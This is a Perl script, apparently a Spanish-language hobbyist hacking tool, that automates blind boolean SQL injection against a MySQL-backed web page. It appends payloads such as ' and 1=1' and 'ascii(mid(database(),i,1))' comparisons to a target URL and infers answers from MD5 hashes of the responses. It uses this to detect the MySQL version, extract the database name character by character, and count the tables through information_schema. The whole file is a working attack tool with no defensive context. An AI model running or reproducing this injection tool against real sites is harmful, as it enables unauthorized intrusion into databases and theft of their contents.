#!/usr/bin/perl
# @ARGV[0] = url
# @ARGV[1] = Version de MySQL
# @ARGV[2] = Database_name
# perl jeringa.pl "http://" "MySQL 5" "database_name"
#
# autor: CiskoSV
use LWP::Simple;


# Definimos los parametros de inyeccion
our $test_verdadero=" and 1=1";
our $test_falso=" and 1=0";
our $inj_version_MySQL_4=" and mid(version(),1,1)=4";
our $inj_version_MySQL_5=" and mid(version(),1,1)=5";
our $inj_db_name_lenght=" and char_length(database())=";

our $url = $ARGV[0];
our $version = $ARGV[1];

our $db_nombre = $ARGV[2];
our $db_nombre_hex=hexa($db_nombre);

our $fecha=`date`;



# creamos el archivo de log
open (LOG,">>sinjection_log.txt");

# agregamos la fecha al log
print LOG "--------------------------------\n$fecha--------------------------------\n";
print LOG "$url\n\n";

###########################################################
# Convierte Ascii a Hex
sub hexa
	{
	my ($cadena)=@_;
	
	foreach my $c (split(//,$cadena)) 
		{
      $hexchars .= sprintf "%x", ord($c);
		}
	return "0x".$hexchars;
	}
###########################################################
# obtiene un md5sum de la pagina
sub digest
	{
	my ($pagina)=@_;
	
  	my $pag = get $pagina;
  	die "No pude obtener $pagina" unless defined $pag;
  	# Guardamos la pagina
  	open(T,">t.html");
  	print T $pag;
  	close(T);
  	# Analizamos su hash
  	our $hash=`md5sum t.html|cut -c 1-32`;
  	system("rm t.html");
  	return $hash;
	}
###########################################################
sub obtener_hashes
	{
	print LOG "Obteniendo hashes...\n";
	print "Obteniendo hashes...\n";
	
	# Obtenemos el hash del archivo verdadero
	digest("$url$test_verdadero");
	print LOG "$url$test_verdadero\n";
	our $hash_v=$hash;
	
	# Obtenemos el hash del archivo falso
	digest("$url$test_falso");
	print LOG "$url$test_falso\n";
	our $hash_f=$hash;
	
	# Agregamos al log
	print LOG "$url$test_verdadero\n";
	print LOG "Hash verdadero: $hash_v\n";
	print LOG "$url$test_falso\n";
	print LOG "Hash falso: $hash_f\n";	
	
	# Mostramos en pantalla
	print "Hash verdadero: $hash_v";
	print "Hash falso: $hash_f";
	
	# Si los hashes son iguales
	if ($hash_v eq $hash_f)
		{
		print LOG "Hashes son iguales, intente inyeccion por tiempos\n";
		print "Hashes son iguales, intente inyeccion por tiempos\n-----\n";
		close(LOG);
		exit;
		}
	# Si los hashes son diferentes
	elsif ($hash_v ne $hash_f)
		{
		print LOG "Hashes son diferentes, posible vulnerabilidad de inyeccion\n-----\n";
		print "Hashes son diferentes, posible vulnerabilidad de inyeccion\n-----\n";
		}
	}
###########################################################	
sub obtener_version_MySQL
	{
	print LOG "Obteniendo version de BD...\n";
	print "Obteniendo version de BD...\n";
	
	# Le agregamos parametro de injeccion para verificar si es version 4
	digest("$url$inj_version_MySQL_4");
	print LOG "$url$inj_version_MySQL_4\n";
	our $hash_4=$hash;
  	
	# Le agregamos parametro de injeccion para verificar si es version 5
	digest("$url$inj_version_MySQL_5");
	print LOG "$url$inj_version_MySQL_5\n";
	our $hash_5=$hash;
  	
  	# Verificamos cual version es la verdadera
	# comparando sus hashes
	
	# Comparamos la version 4
	if ($hash_4 eq $hash_v)
		{
		our $version="MySQL 4";
		print LOG "Version 4 de MySQL, no puedo hacer nada mas...\n-----\n";
		print "Version 4 de MySQL, no puedo hacer nada mas...\n-----\n";
		close(LOG);
		exit;
		}
		
	# Comparamos la version 5
	if ($hash_5 eq $hash_v)
		{
		our $version="MySQL 5";
		print LOG "Version 5 de MySQL, excelente obtengamos mas información!\n-----\n";
		print "Version 5 de MySQL, excelente obtengamos mas información!\n-----\n";
		}
	else
		{
		our $version="Desconocida";
		print LOG "No pude encontrar la versión de BD, saliendo...\n-----\n";
		print "No pude encontrar la versión de BD, saliendo...\n-----\n";
		close(LOG);
		exit;
		}
	
	}
###########################################################
sub obtener_db_MySQL
	{
	# Averiguamos cuantos caracteres tiene el nombre de la BD
	print LOG "Obteniendo longitud del nombre de la BD...\n";
	print "Obteniendo longitud del nombre de la BD...";
	
		my $i=0;
		my $romper="no";
		
		while($romper eq "no")
		{		
		$i++;
		print $i;
 		digest("$url$inj_db_name_lenght$i");
 		print LOG "$url$inj_db_name_lenght$i";
 		if ($hash eq $hash_v)
 			{
 			our $bd_longitud=$i;
 			print LOG " Verdadero!\nEl nombre de la BD tiene $i caracteres\n";
 			print "\nEl nombre de la BD tiene $i caracteres\n\n";
 			$romper="si";
 			}
		if ($romper ne "si") {print LOG " Falso!\n"; print ",";}
		}
		
	# Vamos caracter por caracter para obtener el nombre de la BD
	print LOG "Obteniendo el nombre de la BD...\n";
	print "Obteniendo el nombre de la BD...\n";
	for($i=1; $i<=$bd_longitud; $i++) 
		{
		my $sup=255;
		my $med=128;
		my $inf=0;
		
		for($j=1; $j<=9; $j++) 
			{
			my $injeccion=" and+$sup>ascii(mid(database(),$i,1))";
			digest("$url$injeccion");
			print LOG "$url$injeccion";
			my $hash_db_name=$hash;
			
			if ($hash_db_name eq $hash_v)
				{
				print LOG " Verdadero!\n";
				$sup=$inf+$med;
				$med=($sup-$inf)/2;
				}
			else
				{
				print LOG " Falso!\n";
				$inf = $sup;
				$sup = $sup+$med;
				$med =($sup-$inf)/2;
				}
				
			if ($j==9)
				{
				my $c=pack("C*", $inf);
				print $c;
				print LOG "Letra encontrada: $c\n";
				our $db_nombre = $db_nombre.$c;
				}			
			}		
		}
		our $db_nombre_hex=hexa($db_nombre);
		print "\n-----";
		print LOG "\n-----\nNombre de la BD: $db_nombre\n-----\n";
		print LOG "Nombre de la BD en Hexa: $db_nombre_hex\n-----\n";
	}
###########################################################
sub obtener_tablas_MySQL5
	{
	# Verifica si no hemos pasado el argumento desde linea de comando
	if($db_nombre eq "")
		{
		print "Primero hay que obtener el nombre de la DB, asi que vamos!";
		&obtener_db_MySQL;
		}
	# Averiguando la cantidad de tablas que tiene la BD
	print "\n\nObteniendo cantidad de tablas que tiene la BD...";
	print LOG "Obteniendo cantidad de tablas que tiene la BD...\n";
	my $i=0;
	my $romper="no";
	my $injeccion_obtener_cant_tablas="+and+(SELECT count(*) FROM information_schema.tables WHERE table_schema=$db_nombre_hex)=";
		
	while($romper eq "no")
		{		
		$i++;
		print $i;
 		digest("$url$injeccion_obtener_cant_tablas$i");
 		print LOG "$url$injeccion_obtener_cant_tablas $i";
		if ($hash eq $hash_v)
			{
			our $cant_tablas=$i;
			print LOG " Verdadero!\nLa BD tiene $i tablas\n";
			print "\nLa BD tiene $i tablas\n";
			$romper="si";
			}
		if ($romper ne "si") {print LOG " Falso!\n"; print ",";}
		}
	}
###########################################################

&obtener_hashes;
if ($version eq "")
	{
	&obtener_version_MySQL;
	}
if ($db_nombre eq "")
	{
	&obtener_db_MySQL;
	}
if ($version eq "MySQL 5")
	{
	&obtener_tablas_MySQL5;
	}
close(LOG);
exit;
